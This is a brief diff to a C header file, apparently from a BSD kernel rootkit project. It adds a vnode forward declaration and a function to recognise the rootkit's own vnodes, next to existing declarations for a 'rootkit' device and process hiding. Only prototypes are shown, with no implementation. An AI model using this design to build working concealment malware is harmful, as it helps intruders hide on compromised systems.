@@ -2,6 +2,8 @@
 #define INTERFACE_H
 
 #include <sys/ioccom.h>
+
+struct vnode;
 #include <netinet/in.h>
 
 #define rootkit_DEV_NAME "rootkit"
@@ -23,6 +25,6 @@
 int make_rootkit_dev(void);
 void destroy_rootkit_dev(void);
 void hide_process_syscall(void);
+int rootkit_is_our_vnode(struct vnode *vp);
 
 #endif
-
